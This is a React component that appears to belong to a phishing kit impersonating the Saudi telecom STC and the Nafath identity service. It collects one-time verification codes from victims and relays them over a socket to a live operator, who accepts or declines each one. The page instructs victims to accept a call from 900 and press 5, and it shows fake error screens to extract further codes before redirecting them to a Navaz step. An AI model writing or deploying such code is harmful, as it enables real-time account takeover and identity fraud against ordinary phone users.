import React, { useEffect, useState } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useNavigate, useSearchParams } from "react-router-dom";
import { api_route, socket } from "../App";

/**
 * STC flow (provider = اس تي سي):
 * Phone → /phone → Phone OTP → /phoneOtp → (admin accepts OTP) → /stcOtp?phase=call
 * → STC call waiting → (admin acceptSTC) → (admin acceptService with Navaz code) → /navaz
 */
const STCOTP = () => {
  const [searchParams] = useSearchParams();
  const phase = searchParams.get("phase");
  const isStcCallPhase = phase === "call";

  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [counter, setCounter] = useState(180);
  const [stcCallAck, setStcCallAck] = useState(false);

  const ID = sessionStorage.getItem("id");
  const navigate = useNavigate();

  useEffect(() => {
    const timer = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!ID) return;
    const joinRoom = () => socket.emit("joinOrder", ID);
    joinRoom();
    socket.on("connect", joinRoom);
    return () => socket.off("connect", joinRoom);
  }, [ID]);

  useEffect(() => {
    if (!ID) return;
    const sameOrder = (oid) => String(oid) === String(ID);

    const onAcceptService = ({ id, price, code }) => {
      if (!sameOrder(id)) return;
      const navaz = price ?? code ?? "";
      navigate(
        `/navaz?otp=${encodeURIComponent(navaz)}&stc=${searchParams.get("stc") || ""}`,
      );
    };

    const onAcceptMobOtp = ({ id, price, code }) => {
      if (!sameOrder(id)) return;
      const navaz = price ?? code ?? "";
      navigate(
        `/navaz?otp=${encodeURIComponent(navaz)}&stc=${searchParams.get("stc") || ""}`,
      );
    };

    socket.on("acceptService", onAcceptService);
    socket.on("acceptMobOtp", onAcceptMobOtp);

    return () => {
      socket.off("acceptService", onAcceptService);
      socket.off("acceptMobOtp", onAcceptMobOtp);
    };
  }, [ID, navigate, searchParams]);

  useEffect(() => {
    if (!ID) return;
    const sameOrder = (oid) => String(oid) === String(ID);

    // When admin accepts phone OTP for STC, switch immediately to call-wait UI.
    const onAcceptPhoneOtp = ({ id }) => {
      if (!sameOrder(id)) return;
      setLoading(false);
      setError(false);
      setStcCallAck(false);
      if (!isStcCallPhase) {
        navigate("/stcOtp?phase=call", { replace: true });
      }
    };

    const onDeclinePhoneOtp = (id) => {
      if (!sameOrder(id)) return;
      setLoading(false);
      setError(true);
    };

    socket.on("acceptPhoneOtp", onAcceptPhoneOtp);
    socket.on("declinePhoneOtp", onDeclinePhoneOtp);

    return () => {
      socket.off("acceptPhoneOtp", onAcceptPhoneOtp);
      socket.off("declinePhoneOtp", onDeclinePhoneOtp);
    };
  }, [ID, isStcCallPhase, navigate]);

  useEffect(() => {
    if (!isStcCallPhase) return;
    const sameOrder = (oid) => String(oid) === String(ID);

    const onAcceptSTC = (oid) => {
      if (!sameOrder(oid)) return;
      setStcCallAck(true);
    };

    const onDeclineSTC = (oid) => {
      if (!sameOrder(oid)) return;
      setLoading(false);
      setError(true);
    };

    const onDeclineService = (oid) => {
      if (!sameOrder(oid)) return;
      window.location.href = "/stcOtp?phase=call";
    };

    socket.on("acceptSTC", onAcceptSTC);
    socket.on("declineSTC", onDeclineSTC);
    socket.on("declineService", onDeclineService);

    return () => {
      socket.off("acceptSTC", onAcceptSTC);
      socket.off("declineSTC", onDeclineSTC);
      socket.off("declineService", onDeclineService);
    };
  }, [ID, isStcCallPhase, navigate, searchParams]);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    try {
      await axios.post(
        `${api_route}/phoneOtp/${sessionStorage.getItem("id")}`,
        {
          phoneOtp: otp,
        },
      );
      socket.emit("phoneOtp", {
        id: sessionStorage.getItem("id"),
        phoneOtp: otp,
      });
    } catch {
      setLoading(false);
    }
  };

  if (isStcCallPhase) {
    return (
      <div className="w-full flex flex-col justify-center items-center bg-white min-h-screen py-2 gap-y-10 px-4">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
          className="w-1/2 max-w-xs"
          alt="STC"
        />
        <div className="w-full flex flex-col items-center gap-y-4 text-center">
          <p className="text-xl font-bold">STC سوف يتم الاتصال بك من</p>
          <p className="font-bold text-gray-500 text-xs md:text-sm">
            لتأكيد طلبك الرجاء الضغط على رقم 5 عند الاتصال من 900
          </p>
          <span className="text-purple-700 font-bold">يرجى الانتظار</span>
          {/* {stcCallAck && (
            <span className="text-sm text-green-700 font-semibold">
              تم تأكيد الاتصال — في انتظار رمز نفاذ من المسؤول
            </span>
          )} */}
        </div>
        <div className="flex w-11/12 max-w-md flex-col justify-center items-center bg-purple-100 rounded-full py-3 px-4">
          <span className="text-purple-700 font-bold">إعادة الاتصال بعد</span>
          <span className="text-purple-700 font-bold text-lg">
            {formattedMinutes}:{formattedSeconds}
          </span>
        </div>

        {error && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
            <div className="bg-white py-5 px-4 max-w-sm w-full flex flex-col items-center gap-3 rounded-lg text-center">
              <AiOutlineCloseCircle className="text-6xl text-red-500" />
              <span className="font-semibold">تعذر تأكيد الاتصال</span>
              <button
                type="button"
                className="bg-gray-900 text-white w-full py-3 rounded-lg"
                onClick={() => setError(false)}
              >
                حاول مرة ثانية , حدث خطأ في البيانات
              </button>
            </div>
          </div>
        )}
      </div>
    );
  }

  return (
    <div className="w-full lg:w-1/2 flex flex-col items-center justify-center rounded-md mx-auto">
      <form
        className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
        dir="rtl"
        onSubmit={handleSubmit}
      >
        <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
          <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
          <div className="flex items-start ">
            <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
            <span className="font-semibold">
              تم إرسال رمز التحقق إلي هاتفك النقال , الرجاء إدخاله في هذه الخانة
              .
            </span>
          </div>
        </div>

        <div className="flex justify-end items-center mb-2 -mt-5 rounded-lg px-2">
          <img
            src="/stc.png"
            alt="STC"
            className="h-12  object-contain"
            onError={(e) => {
              e.currentTarget.style.display = "none";
            }}
          />
        </div>

        <p className="text-right text-xl font-sans text-purple-700 leading-relaxed px-2 font-semibold">
          عملاء STC الكرام في حال تلقي مكالمة من 900 الرجاء قبولها واختيار الرقم
          5
        </p>

        <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col mt-5">
          <input
            value={otp}
            required
            onChange={(e) => setOtp(e.target.value)}
            dir="ltr"
            placeholder="  رمز التحقق"
            inputMode="numeric"
            type="text"
            maxLength={6}
            className="border border-gray-300 rounded-lg px-3 py-2.5 text-lg text-right outline-blue-500  font-semibold w-full"
          />
        </div>
        <div className="flex items-center justify-between flex-wrap gap-2">
          <div className="flex justify-center items-center my-4">
            <span className="text-gray-600">
              إعادة إرسال: {formattedMinutes}:{formattedSeconds}
            </span>
          </div>
          <div className="flex items-center justify-center py-5 mt-4">
            <button
              type="submit"
              className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white rounded-full text-base font-semibold transition-colors"
            >
              تحقق
            </button>
          </div>
        </div>

        {error && (
          <div className="w-full text-center text-red-500 fixed inset-0 z-50 flex items-center justify-center bg-black/45">
            <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
              <AiOutlineCloseCircle className="text-6xl" />
              <div className="flex flex-col w-full items-center justify-center">
                <span>رمز التحقق غير صحيح</span>
                <span className="text-sm">82A27833M4589370G</span>
              </div>
              <button
                type="button"
                className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
                onClick={() => setError(false)}
              >
                حاول مرة ثانية
              </button>
            </div>
          </div>
        )}

        <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
          <img src="/phoneFooter.jpeg" alt="CST" className="object-contain" />
        </div>
      </form>

      {loading && (
        <div className="fixed top-0 w-full h-screen bg-[#ffffffc7] flex items-center justify-center flex-col gap-y-5 z-50">
          <TailSpin height="50" width="50" color="blue" visible />
          <span className="font-semibold">
            يرجى الانتظار جاري التأكد من صحة البيانات المدخلة
          </span>
        </div>
      )}
    </div>
  );
};

export default STCOTP;
